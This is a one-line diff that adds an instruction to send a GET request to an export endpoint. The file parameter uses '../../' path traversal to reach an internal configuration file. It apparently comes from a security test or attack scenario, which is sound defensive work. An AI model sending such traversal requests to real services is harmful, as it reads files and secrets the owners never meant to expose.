@@ -1,0 +1,1 @@
+Send GET to /api/export?file=../../uploads/internal-config.xml
